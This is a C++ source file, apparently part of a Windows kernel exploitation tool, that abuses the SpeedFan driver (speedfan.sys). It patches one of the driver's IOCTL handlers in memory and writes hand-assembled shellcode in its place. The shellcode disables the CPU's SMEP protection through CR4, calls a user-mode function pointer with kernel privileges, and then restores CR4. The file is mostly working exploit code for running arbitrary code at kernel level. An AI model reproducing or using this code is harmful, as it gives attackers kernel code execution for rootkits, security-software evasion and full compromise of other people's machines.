#include "Speedfan\SpeedfanHook.h"

#include "Utilities\Superfetch.h"
#include "Memory\Proc.h"
#include "Speedfan\Speedfan.h"
#include "Utilities\Utils.h"


#define TEXT_SECTION_OFFS	0x1000
#define IOCTL_FUNC_OFFS		0x10D5
#define IOCTL_FUNC_SIZE     0x4C

ULONG(NTAPI* DbgPrintEx)(ULONG, ULONG, PCSTR, ...);

SpeedfanHook* g_pHook = new SpeedfanHook();


SpeedfanHook::SpeedfanHook()
{
}


SpeedfanHook::~SpeedfanHook()
{
}


BOOLEAN SpeedfanHook::OnSetup()
{
	return HookIOCTLFunction();
}


BOOLEAN SpeedfanHook::HookIOCTLFunction()
{
	if (!m_ModuleBase)
	{
		m_ModuleBase = g_pFetch->SFGetModuleBase("speedfan.sys");
		if (!m_ModuleBase)
			return false;
	}

	if (!m_NtBase)
	{
		m_NtBase = g_pFetch->SFGetModuleBase("ntoskrnl.exe");
		if (!m_NtBase)
			return false;
	}

	if (!m_MmGetSystemRoutineAddressRVA)
	{
		m_MmGetSystemRoutineAddressRVA = g_pFetch->SFGetNativeProcedureRVA("MmGetSystemRoutineAddress");
		if (!m_MmGetSystemRoutineAddressRVA)
			return false;
	}

	
	uint64_t MmGetSystemRoutineAddress = m_MmGetSystemRoutineAddressRVA + m_NtBase;

	// Set virtual address MmGetSystemRoutineAddress
	m_Params.MmGetSystemRoutineAddress = (PVOID)MmGetSystemRoutineAddress;

	// Virtual address to ioctl handler to be overwritten.
	// We will overwrite the WriteMSR handler.
	uint64_t IOCTLFunction = m_ModuleBase + TEXT_SECTION_OFFS + IOCTL_FUNC_OFFS;

	// memset NOPs
	for (int i = 0; i < IOCTL_FUNC_SIZE; ++i)
		g_pProc->Write<BYTE>(IOCTLFunction + i, 0x90);

	// Before we get to execute this payload, RDI will contain "Systembuffer" passed to the device driver
	BYTE payload[] =
	{
		//0xCC,															// int3							; Breakpoint (For debugging)
		0xFA,															// cli							; Clear interrupts
		0x48, 0x8B, 0x07,												// mov rax, [rdi]				; Get 64bit value passed from usermode through Systembuffer
		0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,		// movabs rcx, 0x0				; Move address to parameters passed to our function (we will overwrite the zeroes)
		0x41, 0x0F, 0x20, 0xE7,											// mov r15, cr4					; Save CR4 in a nonvolatile register
		0x0F, 0x20, 0xE3,												// mov rbx, cr4					; Move CR4 to RBX
		0x48, 0x81, 0xE3, 0xFF, 0xFF, 0xEF, 0xFF,						// and rbx, 0xffffffffffefffff	; Set CR4.SMEP to 0
		0x0F, 0x22, 0xE3,												// mov cr4, rbx					; Set new CR4
		0xFF, 0xD0,														// call rax						; Call our function pointer
		0x41, 0x0F, 0x22, 0xE7,											// mov cr4, r15					; Restore CR4
		0xFB															// sti							; Set interrupts
	};

	// Set pointer to parameter
	// Set to 0x7 if 0xCC (int3) is in shellcode
	*(uint64_t*)(payload + 0x6) = (uint64_t)&m_Params;

	// Write shellcode
	return g_pProc->WriteProcessMemory((PVOID)IOCTLFunction, sizeof(payload), (PVOID)payload);
}


/*
	Calls the parameter function from kernel to usermode
*/
VOID SpeedfanHook::ExecuteHook(PVOID Hook)
{
	g_pSpdfan->ExecuteKernelCallback(Hook);
}



void __stdcall HookFunc(HOOKPARAMS* ParamStruct)
{
	if (ParamStruct == nullptr)
		return;

	PVOID f = (PVOID)ParamStruct->MmGetSystemRoutineAddress;
	DbgPrintEx = (decltype(DbgPrintEx))g_pUtils->GetSystemRoutine(f, L"DbgPrintEx");
	DbgPrintEx(77, 0, "0x%X", ParamStruct->Context);
	return;
}